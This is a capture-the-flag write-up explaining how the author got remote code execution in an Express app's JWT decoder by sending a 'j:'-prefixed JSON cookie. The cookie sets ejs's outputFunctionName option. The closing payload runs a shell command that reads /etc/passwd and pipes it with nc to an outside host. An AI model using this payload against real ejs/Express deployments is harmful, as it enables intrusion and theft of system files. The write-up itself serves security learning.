I participated in the CTF called sstf after 5 months. Today, I wrote that how to solve a JWT Decoder.

```zsh
~/Downloads/prob
❯ tree -I "node_modules"
.
├── Dockerfile
├── docker-compose.yml
├── flag.txt
└── server
    ├── app.js
    ├── nc
    ├── package-lock.json
    ├── package.json
    └── view
        └── index.ejs

2 directories, 8 files

~/Downloads/prob
❯
```
They provided the file as above.

```json
{
  "dependencies": {
    "cookie-parser": "^1.4.6",
    "ejs": "^3.1.6",
    "express": "^4.17.3"
  }
}
```
And when i check the package.json, I could know to use ejs 3.1.6 version. Already many researcher know about how to trigger an RCE in ejs environment. When the ejs parser is working, it make a javascript code as dynamic and then execute it. At the time, there are some gadgets. this gadget is outputFunctionName and destructuredLocals.

While making javascript code, it use after get a value in opts object. But, Normally If you want to pollute a value of opts.outputFunctionName, A Prototype Pollution vulnerability must exist. But there is no.

```javascript
        viewOpts = data.settings['view options'];
        if (viewOpts) {
          utils.shallowCopy(opts, viewOpts);
        }
// https://github.com/mde/ejs/blob/v3.1.6/lib/ejs.js#L473L476
```
I found that using the utils.shallowCopy() method in the EJS code to overwrite the value of data.settings.view.options with the properties of the opts object.

```javascript

const express = require('express');
const cookieParser = require('cookie-parser');
const path = require('path');
const app = express();
const PORT = 3000;

app.use(cookieParser());
app.set('views', path.join(__dirname, "view"));
app.set('view engine', 'ejs');

app.get('/', (req, res) => {
    let rawJwt = req.cookies.jwt || {};

    try {
        let jwtPart = rawJwt.split('.');

        let jwtHeader = jwtPart[0];
        jwtHeader = Buffer.from(jwtHeader, "base64").toString('utf8');
        jwtHeader = JSON.parse(jwtHeader);
        jwtHeader = JSON.stringify(jwtHeader, null, 4);
        rawJwt = {
            header: jwtHeader
        }

        let jwtBody = jwtPart[1];
        jwtBody = Buffer.from(jwtBody, "base64").toString('utf8');
        jwtBody = JSON.parse(jwtBody);
        jwtBody = JSON.stringify(jwtBody, null, 4);
        rawJwt.body = jwtBody;

        let jwtSignature = jwtPart[2];
        rawJwt.signature = jwtSignature;

    } catch(error) {
        if (typeof rawJwt === 'object') {
            rawJwt.error = error;
        } else {
            rawJwt = {
                error: error
            };
        }
    }
    res.render('index', rawJwt);
});

app.use(function(err, req, res, next) {
    console.error(err.stack);
    res.status(500).send('Something wrong!');
});

app.listen(PORT, (err) => {
    console.log(`Server is Running on Port ${PORT}`);
});
```
This is the challenge code. It was found that the value of the cookie was taken, divided by ".", and the values of the header, body, and signature of JWT were put into an object called rawJwt. However, we cannot insert Object because all values are converted back to strings after the strings are converted to JSON type.

Anyway, I could know that the rawJwt object is created and passed as the second argument to the render() method.

```javascript
exports.render = function (template, d, o) {
  var data = d || {};
  var opts = o || {};

  // No options object -- if there are optiony names
  // in the data, copy them to options
  if (arguments.length == 2) {
    utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA);
  }

  return handleCache(opts, template)(data);
};
// https://github.com/mde/ejs/blob/v3.1.6/lib/ejs.js#L413L424
```
The second argument to the render() method goes into the data object. So we have to insert an user-defined object to rawJwt object.

```javascript
function JSONCookie (str) {
  if (typeof str !== 'string' || str.substr(0, 2) !== 'j:') {
    return undefined
  }

  try {
    return JSON.parse(str.slice(2))
  } catch (err) {
    return undefined
  }
}

/**
 * Parse JSON cookies.
 *
 * @param {Object} obj
 * @return {Object}
 * @public
 */

function JSONCookies (obj) {
  var cookies = Object.keys(obj)
  console.log(cookies)
  var key
  var val
  console.log(cookies)
  for (var i = 0; i < cookies.length; i++) {
    key = cookies[i]
    val = JSONCookie(obj[key])

    if (val) {
      obj[key] = val
    }
  }
  return obj
}
// https://github.com/expressjs/cookie-parser/blob/master/index.js#L83L118
```
We generally cannot insert object data into rawJwt objects. However, as a result of analyzing the code of the cookie-parser module, I was able to find out the JsonCookie () function. The JsonCookie () function converts the argument value to JSON in the try statement if it starts with `j:` when the value of the argument is an object.

```json
j:{
  "settings":{
    "view options":{
      "outputFunctionName":"x;process.mainModule.require('child_process').execSync('cat /etc/passwd | nc pocas.kr 9999')//"
    }
  }
}
```
I wrote the payload as above

![](https://cdn.discordapp.com/attachments/966582609377361920/1011607890169167892/2022-08-23_21.08.25.png)

When I sent the payload, I could see that RCE occurred as above.
